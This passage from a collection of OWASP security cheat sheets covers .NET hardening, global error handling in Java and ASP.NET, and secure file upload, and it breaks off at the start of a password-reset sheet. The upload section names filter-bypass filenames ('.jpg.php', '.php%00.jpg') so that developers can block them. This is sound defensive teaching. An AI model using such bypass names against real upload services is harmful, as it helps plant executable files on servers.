Frameworks includes the [AntiXssEncoder](https://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.7.2) library, which has a comprehensive input encoding library for the prevention of XSS. Use it.\r\n- List allowable values anytime user input is accepted.\r\n- Validate the format of URIs using [Uri.IsWellFormedUriString](https://docs.microsoft.com/en-us/dotnet/api/system.uri.iswellformeduristring).\r\n\r\n### Forms authentication\r\n\r\n- Use cookies for persistence when possible. `Cookieless` auth will default to [UseDeviceProfile](https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookiemode?view=netframework-4.7.2).\r\n- Don't trust the URI of the request for persistence of the session or authorization. It can be easily faked.\r\n- Reduce the Forms Authentication timeout from the default of *20 minutes* to the shortest period appropriate for your application. If [slidingExpiration](https://docs.microsoft.com/en-us/dotnet/api/system.web.security.formsauthentication.slidingexpiration?view=netframework-4.7.2) is used this timeout resets after each request, so active users won't be affected.\r\n- If HTTPS is not used, [slidingExpiration](https://docs.microsoft.com/en-us/dotnet/api/system.web.security.formsauthentication.slidingexpiration?view=netframework-4.7.2) should be disabled. Consider disabling [slidingExpiration](https://docs.microsoft.com/en-us/dotnet/api/system.web.security.formsauthentication.slidingexpiration?view=netframework-4.7.2) even with HTTPS.\r\n- Always implement proper access controls.\r\n    - Compare user provided username with `User.Identity.Name`.\r\n    - Check roles against `User.Identity.IsInRole`.\r\n- Use the [ASP.NET Membership provider and role provider](https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/membership-and-role-provider), but review the password storage. The default storage hashes the password with a single iteration of SHA-1 which is rather weak. The ASP.NET MVC4 template uses [ASP.NET Identity](http://www.asp.net/identity/overview/getting-started/introduction-to-aspnet-identity) instead of ASP.NET Membership, and ASP.NET Identity uses PBKDF2 by default which is better. Review the OWASP [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md) for more information.\r\n- Explicitly authorize resource requests.\r\n- Leverage role based authorization using `User.Identity.IsInRole`.\r\n\r\n## XAML Guidance\r\n\r\n- Work within the constraints of Internet Zone security for your application.\r\n- Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time.\r\n\r\n## Windows Forms Guidance\r\n\r\n- Use partial trust when possible. Partially trusted Windows applications reduce the attack surface of an application. Manage a list of what permissions your app must use, and what it may use, and then make the request for those permissions declaratively at runtime.\r\n- Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time.\r\n\r\n## WCF Guidance\r\n\r\n- Keep in mind that the only safe way to pass a request in RESTful services is via `HTTP POST`, with TLS enabled.\r\nUsing `HTTP GET` necessitates putting the data in the URL (e.g. the query string) which is visible to the user and will\r\nbe logged and stored in their browser history.\r\n- Avoid [BasicHttpBinding](https://docs.microsoft.com/en-us/dotnet/api/system.servicemodel.basichttpbinding?view=netframework-4.7.2). It has no default security configuration. Use [WSHttpBinding](https://docs.microsoft.com/en-us/dotnet/api/system.servicemodel.wshttpbinding?view=netframework-4.7.2) instead.\r\n- Use at least two security modes for your binding. Message security includes security provisions in the headers. Transport security means use of SSL. [TransportWithMessageCredential](https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/ws-transport-with-message-credential) combines the two.\r\n- Test your WCF implementation with a fuzzer like [ZAP](https://www.zaproxy.org/).\r\n"
    },
    {
      "Error_Handling_Cheat_Sheet.md": "# Error Handling Cheat Sheet\r\n\r\n## Introduction\r\n\r\nError handling is a part of the overall security of an application. Except in movies, an attack always begins with a **Reconnaissance** phase in which the attacker will try to gather as much technical information (often *name* and *version* properties) as possible about the target, such as the application server, frameworks, libraries, etc.\r\n\r\nUnhandled errors can assist an attacker in this initial phase, which is very important for the rest of the attack.\r\n\r\nThe following [link](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/) provides a description of the different phases of an attack.\r\n\r\n## Context\r\n\r\nIssues at the error handling level can reveal a lot of information about the target and can also be used to identify injection points in the target's features.\r\n\r\nBelow is an example of the disclosure of a technology stack, here the Struts2 and Tomcat versions, via an exception rendered to the user:\r\n\r\n```text\r\nHTTP Status 500 - For input string: \"null\"\r\n\r\ntype Exception report\r\n\r\nmessage For input string: \"null\"\r\n\r\ndescription The server encountered an internal error that prevented it from fulfilling this request.\r\n\r\nexception\r\n\r\njava.lang.NumberFormatException: For input string: \"null\"\r\n    java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\r\n    java.lang.Integer.parseInt(Integer.java:492)\r\n    java.lang.Integer.parseInt(Integer.java:527)\r\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)\r\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n    java.lang.reflect.Method.invoke(Method.java:606)\r\n    com.opensymphony.xwork2.DefaultActionInvocation.invokeAction(DefaultActionInvocation.java:450)\r\n    com.opensymphony.xwork2.DefaultActionInvocation.invokeActionOnly(DefaultActionInvocation.java:289)\r\n    com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:252)\r\n    org.apache.struts2.interceptor.debugging.DebuggingInterceptor.intercept(DebuggingInterceptor.java:256)\r\n    com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:246)\r\n    ...\r\n\r\nnote: The full stack trace of the root cause is available in the Apache Tomcat/7.0.56 logs.\r\n```\r\n\r\nBelow is an example of disclosure of a SQL query error, along with the site installation path, that can be used to identify an injection point:\r\n\r\n```text\r\nWarning: odbc_fetch_array() expects parameter /1 to be resource, boolean given\r\nin D:\\app\\index_new.php on line 188\r\n```\r\n\r\nThe [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/) provides different techniques to obtain technical information from an application.\r\n\r\n## Objective\r\n\r\nThe article shows how to configure a global error handler as part of your application's runtime configuration. In some cases, it may be more efficient to define this error handler as part of your code. The outcome being that when an unexpected error occurs then a generic response is returned by the application but the error details are logged server side for investigation, and not returned to the user.\r\n\r\nThe following schema shows the target approach:\r\n\r\n[object Promise]\r\n\r\nAs most recent application topologies are *API based*, we assume in this article that the backend exposes only a REST API and does not contain any user interface content. The application should try and exhaustively cover all possible failure modes and use 5xx errors only to indicate responses to requests that it cannot fulfill, but not provide any content as part of the response that would reveal implementation details. For that, [RFC 7807 - Problem Details for HTTP APIs](https://www.rfc-editor.org/rfc/rfc7807) defines a document format.  \r\nFor the error logging operation itself, the [logging cheat sheet](Logging_Cheat_Sheet.md) should be used. This article focuses on the error handling part.\r\n\r\n## Proposition\r\n\r\nFor each technology stack, the following configuration options are proposed:\r\n\r\n### Standard Java Web Application\r\n\r\nFor this kind of application, a global error handler can be configured at the **web.xml** deployment descriptor level.\r\n\r\nWe propose here a configuration that can be used from Servlet specification *version 2.5* and above.\r\n\r\nWith this configuration, any unexpected error will cause a redirection to the page **error.jsp** in which the error will be traced and a generic response will be returned.\r\n\r\nConfiguration of the redirection into the **web.xml** file:\r\n\r\n``` xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" ns=\"http://java.sun.com/xml/ns/javaee\"\r\nxsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"\r\nversion=\"3.0\">\r\n...\r\n    <error-page>\r\n        <exception-type>java.lang.Exception</exception-type>\r\n        <location>/error.jsp</location>\r\n    </error-page>\r\n...\r\n</web-app>\r\n```\r\n\r\nContent of the **error.jsp** file:\r\n\r\n``` java\r\n<%@ page language=\"java\" isErrorPage=\"true\" contentType=\"application/json; charset=UTF-8\"\r\n    pageEncoding=\"UTF-8\"%>\r\n<%\r\nString errorMessage = exception.getMessage();\r\n//Log the exception via the content of the implicit variable named \"exception\"\r\n//...\r\n//We build a generic response with a JSON format because we are in a REST API app context\r\n//We also add an HTTP response header to indicate to the client app that the response is an error\r\nresponse.setHeader(\"X-ERROR\", \"true\");\r\n//Note that we're using an internal server error response\r\n//In some cases it may be prudent to return 4xx error codes, when we have misbehaving clients\r\nresponse.setStatus(500);\r\n%>\r\n{\"message\":\"An error occur, please retry\"}\r\n```\r\n\r\n### Java SpringMVC/SpringBoot web application\r\n\r\nWith [SpringMVC](https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html) or [SpringBoot](https://spring.io/projects/spring-boot), you can define a global error handler by implementing the following class in your project. Spring Framework 6 introduced [the problem details based on RFC 7807](https://github.com/spring-projects/spring-framework/issues/27052).\r\n\r\nWe indicate to the handler, via the annotation [@ExceptionHandler](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/ExceptionHandler.html), to act when any exception extending the class *java.lang.Exception* is thrown by the application. We also use the [ProblemDetail class](https://docs.spring.io/spring-framework/docs/6.0.0/javadoc-api/org/springframework/http/ProblemDetail.html) to create the response object.\r\n\r\n``` java\r\nimport org.springframework.http.HttpStatus;\r\nimport org.springframework.http.ProblemDetail;\r\nimport org.springframework.web.bind.annotation.ExceptionHandler;\r\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\r\nimport org.springframework.web.context.request.WebRequest;\r\nimport org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;\r\n\r\n/**\r\n * Global error handler in charge of returning a generic response in case of unexpected error situation.\r\n */\r\n@RestControllerAdvice\r\npublic class RestResponseEntityExceptionHandler extends ResponseEntityExceptionHandler {\r\n\r\n    @ExceptionHandler(value = {Exception.class})\r\n    public ProblemDetail handleGlobalError(RuntimeException exception, WebRequest request) {\r\n        //Log the exception via the content of the parameter named \"exception\"\r\n        //...\r\n        //Note that we're using an internal server error response\r\n        //In some cases it may be prudent to return 4xx error codes, if we have misbehaving clients\r\n        //By specification, the content-type can be \"application/problem+json\" or \"application/problem+xml\"\r\n        return ProblemDetail.forStatusAndDetail(HttpStatus.INTERNAL_SERVER_ERROR, \"An error occur, please retry\");\r\n    }\r\n}\r\n```\r\n\r\nReferences:\r\n\r\n- [Exception handling with Spring](https://www.baeldung.com/exception-handling-for-rest-with-spring)\r\n- [Exception handling with SpringBoot](https://www.toptal.com/java/spring-boot-rest-api-error-handling)\r\n\r\n### ASP NET Core web application\r\n\r\nWith [ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/?view=aspnetcore-2.2), you can define a global error handler by indicating that the exception handler is a dedicated API Controller.\r\n\r\nContent of the API Controller dedicated to the error handling:\r\n\r\n``` csharp\r\nusing Microsoft.AspNetCore.Authorization;\r\nusing Microsoft.AspNetCore.Diagnostics;\r\nusing Microsoft.AspNetCore.Mvc;\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Net;\r\n\r\nnamespace MyProject.Controllers\r\n{\r\n    /// <summary>\r\n    /// API Controller used to intercept and handle all unexpected exception\r\n    /// </summary>\r\n    [Route(\"api/[controller]\")]\r\n    [ApiController]\r\n    [AllowAnonymous]\r\n    public class ErrorController : ControllerBase\r\n    {\r\n        /// <summary>\r\n        /// Action that will be invoked for any call to this Controller in order to handle the current error\r\n        /// </summary>\r\n        /// <returns>A generic error formatted as JSON because we are in a REST API app context</returns>\r\n        [HttpGet]\r\n        [HttpPost]\r\n        [HttpHead]\r\n        [HttpDelete]\r\n        [HttpPut]\r\n        [HttpOptions]\r\n        [HttpPatch]\r\n        public JsonResult Handle()\r\n        {\r\n            //Get the exception that has implied the call to this controller\r\n            Exception exception = HttpContext.Features.Get<IExceptionHandlerFeature>()?.Error;\r\n            //Log the exception via the content of the variable named \"exception\" if it is not NULL\r\n            //...\r\n            //We build a generic response with a JSON format because we are in a REST API app context\r\n            //We also add an HTTP response header to indicate to the client app that the response\r\n            //is an error\r\n            var responseBody = new Dictionary<String, String>{ {\r\n                \"message\", \"An error occur, please retry\"\r\n            } };\r\n            JsonResult response = new JsonResult(responseBody);\r\n            //Note that we're using an internal server error response\r\n            //In some cases it may be prudent to return 4xx error codes, if we have misbehaving clients\r\n            response.StatusCode = (int)HttpStatusCode.InternalServerError;\r\n            Request.HttpContext.Response.Headers.Remove(\"X-ERROR\");\r\n            Request.HttpContext.Response.Headers.Add(\"X-ERROR\", \"true\");\r\n            return response;\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nDefinition in the application **Startup.cs** file of the mapping of the exception handler to the dedicated error handling API controller:\r\n\r\n``` csharp\r\nusing Microsoft.AspNetCore.Builder;\r\nusing Microsoft.AspNetCore.Hosting;\r\nusing Microsoft.AspNetCore.Mvc;\r\nusing Microsoft.Extensions.Configuration;\r\nusing Microsoft.Extensions.DependencyInjection;\r\n\r\nnamespace MyProject\r\n{\r\n    public class Startup\r\n    {\r\n...\r\n        public void Configure(IApplicationBuilder app, IHostingEnvironment env)\r\n        {\r\n            //First we configure the error handler middleware!\r\n            //We enable the global error handler in others environments than DEV\r\n            //because debug page are useful during implementation\r\n            if (env.IsDevelopment())\r\n            {\r\n                app.UseDeveloperExceptionPage();\r\n            }\r\n            else\r\n            {\r\n                //Our global handler is defined on \"/api/error\" URL so we indicate to the\r\n                //exception handler to call this API controller\r\n                //on any unexpected exception raised by the application\r\n                app.UseExceptionHandler(\"/api/error\");\r\n\r\n                //To customize the response content type and text, use the overload of\r\n                //UseStatusCodePages that takes a content type and format string.\r\n                app.UseStatusCodePages(\"text/plain\", \"Status code page, status code: {0}\");\r\n            }\r\n\r\n            //We configure others middlewares, remember that the declaration order is important...\r\n            app.UseMvc();\r\n            //...\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nReferences:\r\n\r\n- [Exception handling with ASP.Net Core](https://docs.microsoft.com/en-us/aspnet/core/fundamentals/error-handling?view=aspnetcore-2.1)\r\n\r\n### ASP NET Web API web application\r\n\r\nWith [ASP.NET Web API](https://www.asp.net/web-api) (from the standard .NET framework and not from the .NET Core framework), you can define and register handlers in order to trace and handle any error that occurs in the application.\r\n\r\nDefinition of the handler for the tracing of the error details:\r\n\r\n``` csharp\r\nusing System;\r\nusing System.Web.Http.ExceptionHandling;\r\n\r\nnamespace MyProject.Security\r\n{\r\n    /// <summary>\r\n    /// Global logger used to trace any error that occurs at application wide level\r\n    /// </summary>\r\n    public class GlobalErrorLogger : ExceptionLogger\r\n    {\r\n        /// <summary>\r\n        /// Method in charge of the management of the error from a tracing point of view\r\n        /// </summary>\r\n        /// <param name=\"context\">Context containing the error details</param>\r\n        public override void Log(ExceptionLoggerContext context)\r\n        {\r\n            //Get the exception\r\n            Exception exception = context.Exception;\r\n            //Log the exception via the content of the variable named \"exception\" if it is not NULL\r\n            //...\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nDefinition of the handler for the management of the error in order to return a generic response:\r\n\r\n``` csharp\r\nusing Newtonsoft.Json;\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Net;\r\nusing System.Net.Http;\r\nusing System.Text;\r\nusing System.Threading;\r\nusing System.Threading.Tasks;\r\nusing System.Web.Http;\r\nusing System.Web.Http.ExceptionHandling;\r\n\r\nnamespace MyProject.Security\r\n{\r\n    /// <summary>\r\n    /// Global handler used to handle any error that occurs at application wide level\r\n    /// </summary>\r\n    public class GlobalErrorHandler : ExceptionHandler\r\n    {\r\n        /// <summary>\r\n        /// Method in charge of handle the generic response send in case of error\r\n        /// </summary>\r\n        /// <param name=\"context\">Error context</param>\r\n        public override void Handle(ExceptionHandlerContext context)\r\n        {\r\n            context.Result = new GenericResult();\r\n        }\r\n\r\n        /// <summary>\r\n        /// Class used to represent the generic response send\r\n        /// </summary>\r\n        private class GenericResult : IHttpActionResult\r\n        {\r\n            /// <summary>\r\n            /// Method in charge of creating the generic response\r\n            /// </summary>\r\n            /// <param name=\"cancellationToken\">Object to cancel the task</param>\r\n            /// <returns>A task in charge of sending the generic response</returns>\r\n            public Task<HttpResponseMessage> ExecuteAsync(CancellationToken cancellationToken)\r\n            {\r\n                //We build a generic response with a JSON format because we are in a REST API app context\r\n                //We also add an HTTP response header to indicate to the client app that the response\r\n                //is an error\r\n                var responseBody = new Dictionary<String, String>{ {\r\n                    \"message\", \"An error occur, please retry\"\r\n                } };\r\n                // Note that we're using an internal server error response\r\n                // In some cases it may be prudent to return 4xx error codes, if we have misbehaving clients \r\n                HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.InternalServerError);\r\n                response.Headers.Add(\"X-ERROR\", \"true\");\r\n                response.Content = new StringContent(JsonConvert.SerializeObject(responseBody),\r\n                                                     Encoding.UTF8, \"application/json\");\r\n                return Task.FromResult(response);\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nRegistration of the both handlers in the application **WebApiConfig.cs** file:\r\n\r\n``` csharp\r\nusing MyProject.Security;\r\nusing System.Web.Http;\r\nusing System.Web.Http.ExceptionHandling;\r\n\r\nnamespace MyProject\r\n{\r\n    public static class WebApiConfig\r\n    {\r\n        public static void Register(HttpConfiguration config)\r\n        {\r\n            //Register global error logging and handling handlers in first\r\n            config.Services.Replace(typeof(IExceptionLogger), new GlobalErrorLogger());\r\n            config.Services.Replace(typeof(IExceptionHandler), new GlobalErrorHandler());\r\n            //Rest of the configuration\r\n            //...\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nSetting customErrors section to the **Web.config** file within the ```csharp <system.web>``` node as follows.\r\n\r\n```csharp\r\n<configuration>\r\n    ...\r\n    <system.web>\r\n        <customErrors mode=\"RemoteOnly\"\r\n                      defaultRedirect=\"~/ErrorPages/Oops.aspx\" />\r\n        ...\r\n    </system.web>\r\n</configuration>\r\n```\r\n\r\nReferences:\r\n\r\n- [Exception handling with ASP.Net Web API](https://exceptionnotfound.net/the-asp-net-web-api-exception-handling-pipeline-a-guided-tour/)\r\n\r\n- [ASP.NET Error Handling](https://docs.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/getting-started-with-aspnet-45-web-forms/aspnet-error-handling)\r\n\r\n## Sources of the prototype\r\n\r\nThe source code of all the sandbox projects created to find the right setup to use is stored in this [GitHub repository](https://github.com/righettod/poc-error-handling).\r\n\r\n## Appendix HTTP Errors\r\n\r\nA reference for HTTP errors can be found here [RFC 2616](https://www.ietf.org/rfc/rfc2616.txt). Using error messages that do not provide implementation details is important to avoid information leakage. In general, consider using 4xx error codes for requests that are due to an error on the part of the HTTP client (e.g. unauthorized access, request body too large) and use 5xx to indicate errors that are triggered on server side, due to an unforeseen bug. Ensure that applications are monitored for 5xx errors which are a good indication of the application failing for some sets of inputs.\r\n"
    },
    {
      "File_Upload_Cheat_Sheet.md": "# File Upload Cheat Sheet\r\n\r\n## Introduction\r\n\r\nFile upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe.\r\n\r\nIn short, the following principles should be followed to reach a secure file upload implementation:\r\n\r\n- **List allowed extensions. Only allow safe and critical extensions for business functionality**\r\n    - **Ensure that [input validation](Input_Validation_Cheat_Sheet.md#file-upload-validation) is applied before validating the extensions.**\r\n- **Validate the file type, don't trust the [Content-Type header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) as it can be spoofed**\r\n- **Change the filename to something generated by the application**\r\n- **Set a filename length limit. Restrict the allowed characters if possible**\r\n- **Set a file size limit**\r\n- **Only allow authorized users to upload files**\r\n- **Store the files on a different server. If that's not possible, store them outside of the webroot**\r\n    - **In the case of public access to the files, use a handler that gets mapped to filenames inside the application (someid -> file.ext)**\r\n- **Run the file through an antivirus or a sandbox if available to validate that it doesn't contain malicious data**\r\n- **Ensure that any libraries used are securely configured and kept up to date**\r\n- **Protect the file upload from [CSRF](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) attacks**\r\n\r\n## File Upload Threats\r\n\r\nIn order to assess and know exactly what controls to implement, knowing what you're facing is essential to protect your assets. The following sections will hopefully showcase the risks accompanying the file upload functionality.\r\n\r\n### Malicious Files\r\n\r\nThe attacker delivers a file for malicious intent, such as:\r\n\r\n1. Exploit vulnerabilities in the file parser or processing module (_e.g._ [ImageTrick Exploit](https://imagetragick.com/), [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing))\r\n2. Use the file for phishing (_e.g._ careers form)\r\n3. Send ZIP bombs, XML bombs (otherwise known as billion laughs attack), or simply huge files in a way to fill the server storage which hinders and damages the server's availability\r\n4. Overwrite an existing file on the system\r\n5. Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable.\r\n\r\n### Public File Retrieval\r\n\r\nIf the file uploaded is publicly retrievable, additional threats can be addressed:\r\n\r\n1. Public disclosure of other files\r\n2. Initiate a DoS attack by requesting lots of files. Requests are small, yet responses are much larger\r\n3. File content that could be deemed as illegal, offensive, or dangerous (_e.g._ personal data, copyrighted data, etc.) which will make you a host for such malicious files.\r\n\r\n## File Upload Protection\r\n\r\nThere is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service. Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service.\r\n\r\n### Extension Validation\r\n\r\nEnsure that the validation occurs after decoding the file name, and that a proper filter is set in place in order to avoid certain known bypasses, such as the following:\r\n\r\n- Double extensions, _e.g._ `.jpg.php`, where it circumvents easily the regex `\\.jpg`\r\n- Null bytes, _e.g._ `.php%00.jpg`, where `.jpg` gets truncated and `.php` becomes the new extension\r\n- Generic bad regex that isn't properly tested and well reviewed. Refrain from building your own logic unless you have enough knowledge on this topic.\r\n\r\nRefer to the [Input Validation CS](Input_Validation_Cheat_Sheet.md) to properly parse and process the extension.\r\n\r\n#### List Allowed Extensions\r\n\r\nEnsure the usage of _business-critical_ extensions only, without allowing any type of _non-required_ extensions. For example if the system requires:\r\n\r\n- image upload, allow one type that is agreed upon to fit the business requirement;\r\n- cv upload, allow `docx` and `pdf` extensions.\r\n\r\nBased on the needs of the application, ensure the **least harmful** and the **lowest risk** file types to be used.\r\n\r\n#### Block Extensions\r\n\r\nIdentify potentially harmful file types and block extensions that you regard harmful to your service.\r\n\r\nPlease be aware that blocking specific extensions is a weak protection method on its own. The [Unrestricted File Upload vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) article describes how attackers may attempt\r\nto bypass such a check.\r\n\r\n### Content-Type Validation\r\n\r\n_The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof. Although it should not be relied upon for security, it provides a quick check to prevent users from unintentionally uploading files with the incorrect type._\r\n\r\nOther than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks.\r\n\r\nThis can be done preferably in an allow list approach; otherwise, this can be done in a block list approach.\r\n\r\n### File Signature Validation\r\n\r\nIn conjunction with [content-type validation](#content-type-validation), validating the file's signature can be checked and verified against the expected file that should be received.\r\n\r\n> This should not be used on its own, as bypassing it is pretty common and easy.\r\n\r\n### Filename Sanitization\r\n\r\nFilenames can endanger the system in multiple ways, either by using non acceptable characters, or by using special and restricted filenames. For Windows, refer to the following [MSDN guide](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN#naming-conventions). For a wider overview on different filesystems and how they treat files, refer to [Wikipedia's Filename page](https://en.wikipedia.org/wiki/Filename).\r\n\r\nIn order to avoid the above mentioned threat, creating a **random string** as a file-name, such as generating a UUID/GUID, is essential. If the filename is required by the business needs, proper input validation should be done for client-side (_e.g._ active content that results in XSS and CSRF attacks) and back-end side (_e.g._ special files overwrite or creation) attack vectors. Filename length limits should be taken into consideration based on the system storing the files, as each system has its own filename length limit. If user filenames are required, consider implementing the following:\r\n\r\n- Implement a maximum length\r\n- Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods\r\n    - If this is not possible, block-list dangerous characters that could endanger the framework and system that is storing and using the files.\r\n\r\n### File Content Validation\r\n\r\nAs mentioned in the [Public File Retrieval](#public-file-retrieval) section, file content can contain malicious, inappropriate, or illegal data.\r\n\r\nBased on the expected type, special file content validation can be applied:\r\n\r\n- For **images**, applying image rewriting techniques destroys any kind of malicious content injected in an image; this could be done through [randomization](https://security.stackexchange.com/a/8625/118367).\r\n- For **Microsoft documents**, the usage of [Apache POI](https://poi.apache.org/) helps validating the uploaded documents.\r\n- **ZIP files** are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous.\r\n\r\nThe File Upload service should allow users to report illegal content, and copyright owners to report abuse.\r\n\r\nIf there are enough resources, manual file review should be conducted in a sandboxed environment before releasing the files to the public.\r\n\r\nAdding some automation to the review could be helpful, which is a harsh process and should be well studied before its usage. Some services (_e.g._ Virus Total) provide APIs to scan files against well known malicious file hashes. Some frameworks can check and validate the raw content type and validating it against predefined file types, such as in [ASP.NET Drawing Library](https://docs.microsoft.com/en-us/dotnet/api/system.drawing.imaging.imageformat). Beware of data leakage threats and information gathering by public services.\r\n\r\n### File Storage Location\r\n\r\nThe location where the files should be stored must be chosen based on security and business requirements. The following points are set by security priority, and are inclusive:\r\n\r\n1. Store the files on a **different host**, which allows for complete segregation of duties between the application serving the user, and the host handling file uploads and their storage.\r\n2. Store the files **outside the webroot**, where only administrative access is allowed.\r\n3. Store the files **inside the webroot**, and set them in write permissions only.\r\n   - If read access is required, setting proper controls is a must (_e.g._ internal IP, authorized user, etc.)\r\n\r\nStoring files in a studied manner in databases is one additional technique. This is sometimes used for automatic backup processes, non file-system attacks, and permissions issues. In return, this opens up the door to performance issues (in some cases), storage considerations for the database and its backups, and this opens up the door to SQLi attack. This is advised only when a DBA is on the team and that this process shows to be an improvement on storing them on the file-system.\r\n\r\n> Some files are emailed or processed once they are uploaded, and are not stored on the server. It is essential to conduct the security measures discussed in this sheet before doing any actions on them.\r\n\r\n### User Permissions\r\n\r\nBefore any file upload service is accessed, proper validation should occur on two levels for the user uploading a file:\r\n\r\n- Authentication level\r\n    - The user should be a registered user, or an identifiable user, in order to set restrictions and limitations for their upload capabilities\r\n- Authorization level\r\n    - The user should have appropriate permissions to access or modify the files\r\n\r\n### Filesystem Permissions\r\n\r\n> Set the files permissions on the principle of least privilege.\r\n\r\nFiles should be stored in a way that ensures:\r\n\r\n- Allowed system users are the only ones capable of reading the files\r\n- Required modes only are set for the file\r\n    - If execution is required, scanning the file before running it is required as a security best practice, to ensure that no macros or hidden scripts are available.\r\n\r\n### Upload and Download Limits\r\n\r\nThe application should set proper size limits for the upload service in order to protect the file storage capacity. If the system is going to extract the files or process them, the file size limit should be considered after file decompression is conducted and by using secure methods to calculate zip files size. For more on this, see how to [Safely extract files from ZipInputStream](https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream), Java's input stream to handle ZIP files.\r\n\r\nThe application should set proper request limits as well for the download service if available to protect the server from DoS attacks.\r\n\r\n## Java Code Snippets\r\n\r\n[Document Upload Protection](https://github.com/righettod/document-upload-protection) repository written by Dominique for certain document types in Java.\r\n"
    },
    {
      "Forgot_Password_Cheat_Sheet.md": "# Forgot Password Cheat Sheet\r\n\r\n## Introduction\r\n\r\nIn order to implement a proper user management system, systems integrate a **Forgot Password** service that allows the user to request a password reset.\r\n\r\nEven though this functionality looks straightforward and easy to implement, it is a common source of vulnerabilities, such as the renowned [user enumeration attack](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.html).\r\n\r\nThe following short guidelines can be used as a quick reference to protect the forgot password service:\r\n\r\n- **Return a consistent message for both existent and non-existent accounts.**\r\n- **Ensure that the time taken for the user response message is uniform.**\r\n- **Use a side-channel to communicate the method to reset their password.**\r\n- **Use [URL tokens](#url-tokens) for the simplest and fastest implementation.**\r\n- **Ensure that generated tokens or codes are:**\r\n    - **Randomly generated using a cryptographically safe algorithm.**\r\n    - **Sufficiently long to protect against brute-force attacks.**\r\n    - **Stored securely.**\r\n    - **Single use and expire after an appropriate period.**\r\n- **Do not make a change to the account until a valid token is presented, such as locking out the account**\r\n\r\nThis cheat sheet is focused on resetting users passwords. For guidance on resetting multifactor authentication (MFA), see the relevant section in the [Multifactor Authentication Cheat Sheet](Multifactor_Authentication_Cheat_Sheet.md#resetting-mfa).\r\n\r\n## Forgot Password Service\r\n\r\nThe password reset process can be broken into two main steps, detailed in the following sections.\r\n\r\n### Forgot Password Request\r\n\r\nWhen a user uses the forgot password service and inputs their username or email, the below should be followed to implement a secure process:\r\n\r\n- Return a consistent message for both existent and non-existent accounts.\r\n- Ensure that responses return in a consistent amount of time to prevent an attacker enumerating which accounts exist. This could be achieved by using asynchronous calls or by making sure that the same logic is followed, instead of using a quick exit method.\r\n- Implement protections against excessive automated submissions such as rate-limiting on a per-account basis, requiring a CAPTCHA, or other controls. Otherwise an attacker could make thousands of password reset requests per hour for a given account, flooding the user's intake system (e.g., email inbox or SMS) with useless requests.\r\n- Employ normal security measures, such as [SQL Injection Prevention methods](SQL_Injection_Prevention_Cheat_Sheet.md) and [Input Validation](Input_Validation_Cheat_Sheet.md).\r\n\r\n### User Resets Password\r\n\r\nOnce the user has proved their identity by providing the token (sent via an email) or code (sent via SMS or other mechanisms), they should reset their password to a new secure one. In order to secure this step, the measures that should be taken are:\r\n\r\n- The user should confirm the password they set by writing it twice.\r\n- Ensure that a secure password policy is in place, and is consistent with the rest of the application.\r\n- Update and store the password following [secure practices](Password_Storage_Cheat_Sheet.md).\r\n- Send the user an email informing them that their password has been reset (do not send the password in the email!).\r\n- Once they have set their new password, the user should then login through the usual mechanism. Don't automatically log the user in, as this introduces additional complexity to the authentication and session handling code, and increases the likelihood of introducing vulnerabilities.\r\n- Ask the user if they want to invalidate all of their existing sessions, or invalidate the sessions automatically.\r\n\r\n## Methods\r\n\r\nIn 